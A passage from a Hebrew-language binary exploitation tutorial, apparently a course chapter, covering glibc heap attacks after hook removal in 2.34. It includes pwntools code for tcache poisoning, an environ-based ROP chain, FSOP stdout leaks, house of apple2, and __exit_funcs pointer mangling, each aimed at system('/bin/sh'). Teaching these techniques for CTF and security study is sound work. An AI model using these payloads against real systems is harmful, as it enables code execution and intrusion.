+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>          <span class="c1"># libc base from an earlier leak</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="c1"># tcache poisoning: allocate a chunk over __free_hook</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="n">alloc_over</span><span class="p">(</span><span class="n">free_hook</span><span class="p">)</span>                            <span class="c1"># malloc returned a pointer to __free_hook</span>
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="n">write_over</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>                          <span class="c1"># __free_hook = system</span>
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="c1"># prepare a chunk containing &quot;/bin/sh\0&quot; and free it</span>
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="n">idx</span> <span class="o">=</span> <span class="n">add</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;/bin/sh</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">)</span>
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="n">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span>                                       <span class="c1"># free(&quot;/bin/sh&quot;) -&gt; system(&quot;/bin/sh&quot;)</span>
+</code></pre></div>
+<p>זה עבד בצורה מושלמת מ-2.26 ועד 2.33. לכן, אם אתם exploiting binary שרץ על 2.27 עד 2.31 (מאוד נפוץ ב-CTF וב-Ubuntu 18.04 / 20.04), זו עדיין התשובה הפשוטה ביותר, ואין סיבה להתאמץ יותר. בכל שאר השיעור נניח שההוקים כבר לא קיימים, כי זה המצב שמכריח אותנו ללמוד את שאר הארסנל.</p>
+<h2 id="-glibc-234">מה השתנה - הסרת ההוקים בglibc 2.34<a class="headerlink" href="#-glibc-234" title="Permanent link">&para;</a></h2>
+<p>בגרסה 2.34 (יצאה באוגוסט 2021, ומגיעה עם Ubuntu 21.10) מפתחי glibc הסירו את <code>__malloc_hook</code>, <code>__free_hook</code>, <code>__realloc_hook</code> ו-<code>__memalign_hook</code>. הם היו אבן שואבת לתוקפים ולא נתנו ערך אמיתי למשתמשים חוקיים. הסמלים עדיין קיימים לתאימות בינארית, אבל <code>malloc</code> ו-<code>free</code> כבר לא קוראים אליהם - כתיבה עליהם פשוט לא עושה כלום.</p>
+<p>זו נקודת המפנה של הפרק. מ-2.34 ואילך, כתיבה שרירותית שהשגנו מ-tcache poisoning כבר לא מתורגמת ישירות להרצת קוד. אנחנו צריכים מטרה שעדיין נקראת אוטומטית על ידי הזרימה הרגילה של התוכנית. יש כמה כאלה, וכולן מסתמכות על אותו רעיון: למצוא בזרימה הרגילה מקום שבו libc קוראת דרך מצביע שאנחנו יכולים לדרוס.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>the sequence called automatically in every program:
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>  exit()  /  return from main
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>     |
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>     +--&gt; __run_exit_handlers   ---&gt; calls pointers from __exit_funcs (target 3)
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>     |
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>     +--&gt; _IO_cleanup -&gt; _IO_flush_all
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>              |
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>              +--&gt; for every FILE in _IO_list_all: calls vtable-&gt;__overflow (target 2, FSOP)
+</code></pre></div>
+<p>וגם מטרה שאיננה קשורה ל-exit בכלל: לכתוב chain ROP ישר על המחסנית של הפונקציה שרצה עכשיו, דרך leak כתובת מחסנית מ-<code>environ</code> (מטרה 1). נעבור על כולן.</p>
+<h2 id="1-chain-rop-environ">מטרה 1 - כתיבת chain ROP למחסנית דרך environ<a class="headerlink" href="#1-chain-rop-environ" title="Permanent link">&para;</a></h2>
+<p>זו לדעתי המטרה הכי אמינה ואינטואיטיבית אחרי מות ההוקים, והיא עובדת על כל גרסה - 2.27 ועד 2.39 - כי היא לא נשענת על שום פרט פנימי של malloc. הרעיון: יש לנו כתיבה שרירותית, אז נכתוב chain ROP ישירות על הreturn address של פונקציה שנמצאת כרגע על המחסנית. כשהפונקציה תחזור, הchain תרוץ.</p>
+<p>הבעיה היחידה: ASLR מזיז את המחסנית בכל הרצה, אז אנחנו לא יודעים לאן לכתוב. כאן נכנס <code>environ</code>. ב-libc יש סמל גלובלי בשם <code>environ</code> (הוא <code>__environ</code>), שמכיל <strong>מצביע למערך משתני הסביבה</strong>, ומערך זה יושב גבוה על המחסנית. כלומר, אם נקרא 8 בתים מהכתובת <code>libc.sym['environ']</code>, נקבל כתובת מחסנית אמיתית של ההרצה הנוכחית:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>libc (known address after a leak)      the stack (random from ASLR)
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>+---------------------------+           +--------------------------+
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>| environ:  0x7fff.....f28 -+---------&gt; | envp[0] -&gt; &quot;PATH=...&quot;    |  &lt;- high address
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>+---------------------------+           | ...                      |
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>                                        | saved return addr of main|  &lt;- this is where we want to write
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>                                        | ...                      |
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>                                        +--------------------------+
+</code></pre></div>
+<p>התהליך המלא, בשני שלבים של הפרימיטיב:</p>
+<ol>
+<li>tcache poisoning ראשון: מקצים chunk מעל <code>libc.sym['environ']</code>, קוראים אותו, ומקבלים כתובת מחסנית. נקרא לה <code>stack_leak</code>.</li>
+<li>מחשבים את כתובת הreturn address שאנחנו רוצים לדרוס: <code>target = stack_leak - delta</code>. את ה-<code>delta</code> הקבוע (המרחק בין <code>environ</code> לבין ה-saved RIP של הפונקציה שתחזור) מוצאים פעם אחת ב-gdb, והוא זהה בכל הרצה כי המרחק בין שתי כתובות על אותה מחסנית קבוע.</li>
+<li>tcache poisoning שני: מקצים chunk מעל <code>target</code>, וכותבים לשם chain ROP.</li>
+</ol>
+<p>הchain עצמה היא ret2libc קלאסי כמו שלמדנו בפרק 4, כי NX מונע shellcode:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="n">chain</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>    <span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">&#39;ret&#39;</span><span class="p">])[</span><span class="mi">0</span><span class="p">],</span>          <span class="c1"># alignment to 16 bytes for movaps in system</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>    <span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">&#39;pop rdi&#39;</span><span class="p">,</span> <span class="s1">&#39;ret&#39;</span><span class="p">])[</span><span class="mi">0</span><span class="p">],</span>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>    <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)),</span>
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>    <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">],</span>
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="p">)</span>
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="n">write_over</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">chain</span><span class="p">)</span>                  <span class="c1"># overwrite the saved RIP + whatever follows it</span>
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="c1"># when the function returns -&gt; pop rdi; ret; system(&quot;/bin/sh&quot;) -&gt; shell</span>
+</code></pre></div>
+<p>איך מוצאים את ה-<code>delta</code>? מריצים ב-gdb, עוצרים בתוך פונקציית הקלט, ומשווים:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>pwndbg&gt; p/x (long)environ            # e.g. 0x7fffffffe1a8
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>pwndbg&gt; stack 40                      # locate main&#39;s saved RIP in the frame
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>pwndbg&gt; # assume it&#39;s at 0x7fffffffe088
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a># delta = 0x7fffffffe1a8 - 0x7fffffffe088 = 0x120
+</code></pre></div>
+<p>חשוב: המטרה חייבת להיות saved RIP של פונקציה ש<strong>תחזור אחרי</strong> שסיימנו לכתוב. בתפריט heap טיפוסי, טוב לכוון ל-saved RIP של הפונקציה שקוראת את הקלט, או להריץ עוד סבב ולתת ל-<code>main</code> לחזור. זו הדרך הכי נקייה ל-shell, בלי להתעסק במבנים פנימיים של libc.</p>
+<h2 id="2-file-vtable-fsop">מטרה 2 - תקיפת מבני FILE ושרשור vtable - FSOP<a class="headerlink" href="#2-file-vtable-fsop" title="Permanent link">&para;</a></h2>
+<p>הטכניקה FSOP, קיצור של File Stream Oriented Programming, exploits את מבני ה-<code>FILE</code> של libc. כל זרם (<code>stdout</code>, <code>stderr</code>, וכל <code>FILE*</code>) הוא מבנה <code>_IO_FILE</code>, ובסופו מצביע ל-<code>vtable</code> - טבלת פונקציות וירטואליות. פעולות כמו <code>fwrite</code>, <code>puts</code> ו-<code>fflush</code> קוראות דרך ה-vtable, למשל <code>fp-&gt;vtable-&gt;__overflow(fp)</code>. אם נשלוט בתוכן ה-<code>FILE</code> וב-vtable שלו, נשלוט לאן הקריאה הזו קופצת.</p>
+<h3 id="leak-io_2_1_stdout">הleak המהירה דרך <em>IO_2_1_stdout</em><a class="headerlink" href="#leak-io_2_1_stdout" title="Permanent link">&para;</a></h3>
+<p>לפני RCE, שווה להכיר את השימוש הכי קל ב-FSOP - leak כתובות. אם יש לנו כתיבה על <code>_IO_2_1_stdout_</code> (מבנה ה-<code>FILE</code> של stdout, סמל ידוע ב-libc), אפשר לגרום ל-<code>puts</code>/<code>printf</code> הבא לleak זיכרון. הטריק: מדליקים בשדה <code>_flags</code> את הביט <code>0xfbad1800</code> ומאפסים את הבית התחתון של <code>_IO_write_base</code>, כך ש-stdout ידפיס את כל התחום מ-<code>_IO_write_base</code> עד <code>_IO_write_ptr</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">fake</span> <span class="o">=</span> <span class="n">FileStructure</span><span class="p">()</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="n">fake</span><span class="o">.</span><span class="n">flags</span> <span class="o">=</span> <span class="mh">0xfbad1800</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="n">fake</span><span class="o">.</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">]</span>    <span class="c1"># alignment</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="n">fake</span><span class="o">.</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="mi">0</span>                              <span class="c1"># zero the low byte -&gt; prints backward</span>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="n">fake</span><span class="o">.</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="mh">0xffffffff</span>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="n">write_over</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">],</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">fake</span><span class="p">))</span>
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="c1"># the next puts will print bytes from memory -&gt; libc / stack leak</span>
+</code></pre></div>
+<p>הספרייה pwntools נותנת את <code>FileStructure()</code> בדיוק בשביל זה, כדי לא לספור offsets ידנית. זו דרך נהדרת להשיג leak כשאין <code>view</code> נוח בתוכנית.</p>
+<h3 id="-house-of-apple2">הרצת קוד בעת יציאה - house of apple2<a class="headerlink" href="#-house-of-apple2" title="Permanent link">&para;</a></h3>
+<p>לקבל RCE דרך FSOP קשה יותר, כי מאז glibc 2.24 יש בדיקת vtable: <code>_IO_vtable_check</code> מוודא שמצביע ה-vtable נופל בתוך המקטע <code>__libc_IO_vtables</code>. אי אפשר יותר סתם להצביע את ה-vtable לכתובת שרירותית. הפתרון המודרני, שנקרא house of apple2 ועובד מצוין על 2.34 ו-2.35, exploits vtable <strong>חוקי</strong> אבל מסלול שבסופו קפיצה דרך מצביע ש<strong>איננו</strong> נבדק.</p>
+<p>הרעיון: הזרימה של <code>exit()</code> מגיעה ל-<code>_IO_flush_all_lockp</code>, שרצה על כל <code>FILE</code> ב-<code>_IO_list_all</code>, ולכל אחד קוראת <code>_IO_OVERFLOW</code>. נזייף <code>FILE</code> ונצביע את ה-vtable שלו ל-<code>_IO_wfile_jumps</code> (vtable חוקי שעובר את הבדיקה). אצל ה-vtable הזה <code>__overflow</code> הוא <code>_IO_wfile_overflow</code>, שבתנאים מסוימים קורא ל-<code>_IO_wdoallocbuf</code>, שקורא ל-<code>fp-&gt;_wide_data-&gt;_wide_vtable-&gt;__doallocate(fp)</code>. ה-<code>_wide_vtable</code> הזה <strong>לא נבדק</strong>. אם נצביע אותו למבנה מזויף שבו <code>__doallocate = system</code>, ונדאג שתחילת ה-<code>FILE</code> תכיל <code>"/bin/sh"</code>, נקבל <code>system("/bin/sh")</code>.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>_IO_list_all --&gt; fake FILE (in our buffer)
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>                 +------------------------------------------+
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>                 | _flags = &quot;  /bin/sh&quot;  (both flags and string) |
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>                 | _IO_write_base = 0, _IO_write_ptr = 1     |  &lt;- so that flush calls overflow
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>                 | _wide_data ---------&gt; fake wide_data      |
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>                 | vtable = _IO_wfile_jumps (legit, passes the check)|
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>                 +------------------------------------------+
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>                        fake wide_data:
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>                        _IO_write_base = 0
+<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>                        _wide_vtable ---&gt; fake vtable
+<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>                                          __doallocate = system  &lt;- not checked!
+</code></pre></div>
+<p>בפועל עם pwntools זה נראה כך (הכתובות יחסיות לבסיס libc שכבר דלפנו, ו-<code>fake</code> יושב ב-chunk שאנחנו שולטים בכתובתו):</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">fake_addr</span>   <span class="o">=</span> <span class="n">heap_chunk_we_control</span>          <span class="c1"># address of the fake FILE</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="n">wide_addr</span>   <span class="o">=</span> <span class="n">fake_addr</span> <span class="o">+</span> <span class="mh">0x100</span>              <span class="c1"># wide_data inside the same buffer</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="n">wide_vtable</span> <span class="o">=</span> <span class="n">fake_addr</span> <span class="o">+</span> <span class="mh">0x200</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="n">payload</span>  <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;  /bin/sh&#39;</span><span class="p">))</span>            <span class="c1"># _flags with /bin/sh inside</span>
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">6</span>
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="n">payload</span>  <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>                   <span class="c1"># _IO_write_base=0, _IO_write_ptr=1</span>
+<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="n">payload</span>  <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">wide_addr</span><span class="p">)</span>                    <span class="c1"># _wide_data</span>
+<a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="n">payload</span>  <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xd8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_wfile_jumps&#39;</span><span class="p">])</span>  <span class="c1"># legit vtable -&gt; _IO_wfile_overflow</span>
+<a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>
+<a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a><span class="c1"># fake wide_data</span>
+<a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a><span class="n">wide</span>  <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span>                             <span class="c1"># _IO_write_base = NULL to trigger the allocation</span>
+<a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a><span class="n">wide</span>  <span class="o">=</span> <span class="n">wide</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xe0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a><span class="n">wide</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">wide_vtable</span><span class="p">)</span>                     <span class="c1"># _wide_vtable</span>
+<a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a>
+<a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a><span class="c1"># fake vtable: __doallocate at offset 0x68</span>
+<a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a><span class="n">vt</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x68</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span>
+<a id="__codelineno-8-21" name="__codelineno-8-21" href="#__codelineno-8-21"></a>
+<a id="__codelineno-8-22" name="__codelineno-8-22" href="#__codelineno-8-22"></a><span class="c1"># write the three parts to our buffer, then overwrite _IO_list_all</span>
+<a id="__codelineno-8-23" name="__codelineno-8-23" href="#__codelineno-8-23"></a><span class="n">write_over</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_list_all&#39;</span><span class="p">],</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_addr</span><span class="p">))</span>
+<a id="__codelineno-8-24" name="__codelineno-8-24" href="#__codelineno-8-24"></a><span class="n">trigger_exit</span><span class="p">()</span>                               <span class="c1"># exit -&gt; flush -&gt; system(&quot;/bin/sh&quot;)</span>
+</code></pre></div>
+<p>הבדיקה שכדאי לזכור: <code>_IO_wfile_overflow</code> דורש ש-<code>_flags</code> לא יכיל את הביט <code>_IO_NO_WRITES</code> (0x8), ושה-<code>_wide_data-&gt;_IO_write_base</code> יהיה <code>NULL</code> כדי שהמסלול יגיע לפונקציית ההקצאה. את <code>_IO_write_ptr &gt; _IO_write_base</code> צריך כדי ש-<code>_IO_flush_all_lockp</code> בכלל יקרא ל-overflow. אם תזכרו את שלושת התנאים, תוכלו לבנות את המבנה מזיכרון.</p>
+<h2 id="3-__exit_funcs">מטרה 3 - דריסת מטפלי היציאה - __exit_funcs<a class="headerlink" href="#3-__exit_funcs" title="Permanent link">&para;</a></h2>
+<p>כשתוכנית קוראת ל-<code>exit()</code> (או <code>main</code> מבצע <code>return</code>), libc מריצה את <code>__run_exit_handlers</code>, שעוברת על רשימה מקושרת של מטפלים שנרשמו דרך <code>atexit</code>. הרשימה מתחילה במבנה <code>initial</code> שאליו מצביע <code>__exit_funcs</code>. כל כניסה מכילה מצביע פונקציה שנקרא בסוף.</p>
+<p>נשמע כמו מטרה מושלמת לכתיבה, אבל יש מלכודת: המצביעים האלה <strong>מעורבבים</strong> ב-PTR_MANGLE. לפני שקוראים למצביע, libc מבצעת PTR_DEMANGLE:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nf">ror</span><span class="w"> </span><span class="no">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">0x11</span><span class="w">          </span><span class="c1">; rotate right by 17 bits</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="nf">xor</span><span class="w"> </span><span class="no">rax</span><span class="p">,</span><span class="w"> </span><span class="no">fs</span><span class="p">:[</span><span class="mi">0x30</span><span class="p">]</span><span class="w">     </span><span class="c1">; xor with the pointer guard from the TLS</span>
+</code></pre></div>
+<p>ה-<code>fs:[0x30]</code> הוא ה-pointer guard, ערך אקראי שנקבע באתחול התהליך. כדי לכתוב מצביע ש<strong>יפוענח</strong> לכתובת המטרה שלנו, אנחנו צריכים לחשב הפוך: <code>mangled = (target XOR guard)</code> מסובב שמאלה 17. אבל בשביל זה חייבים לדעת את ה-guard, שהוא אקראי. יש שתי דרכים:</p>
+<ul>
+<li>אם יש לנו כתיבה שרירותית ל-TLS, אפשר פשוט <strong>לאפס</strong> את <code>fs:[0x30]</code>. אז PTR_DEMANGLE הופך ל-<code>ror</code> בלבד, ואנחנו יכולים לזייף מצביע בקלות (מסובבים את המטרה שמאלה 17). זו הגישה הנקייה.</li>
+<li>אם יש לנו leak של ה-guard, מחשבים <code>mangled</code> ישירות.</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">guard</span> <span class="o">=</span> <span class="n">leaked_pointer_guard</span>                 <span class="c1"># from fs:0x30, if we managed to leak it</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="k">def</span><span class="w"> </span><span class="nf">mangle</span><span class="p">(</span><span class="n">ptr</span><span class="p">):</span>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>    <span class="k">return</span> <span class="n">rol</span><span class="p">(</span><span class="n">ptr</span> <span class="o">^</span> <span class="n">guard</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="n">fake_funcs</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span>
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>    <span class="mh">0x8</span><span class="p">:</span>  <span class="mi">1</span><span class="p">,</span>                                  <span class="c1"># count = 1</span>
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>    <span class="mh">0x18</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span>                                  <span class="c1"># flavor = ef_cxa (4)</span>
+<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>    <span class="mh">0x20</span><span class="p">:</span> <span class="n">mangle</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]),</span>         <span class="c1"># the function pointer</span>
+<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>    <span class="mh">0x28</span><span class="p">:</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)),</span>  <span class="c1"># the argument (rdi)</span>
+<a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="p">})</span>
+<a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a><span class="c1"># allocate over __exit_funcs and point it to our structure, or write the structure itself</span>
+<a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a><span class="n">write_over</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__exit_funcs&#39;</span><span class="p">],</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr_of_fake_funcs</span><span class="p">))</span>
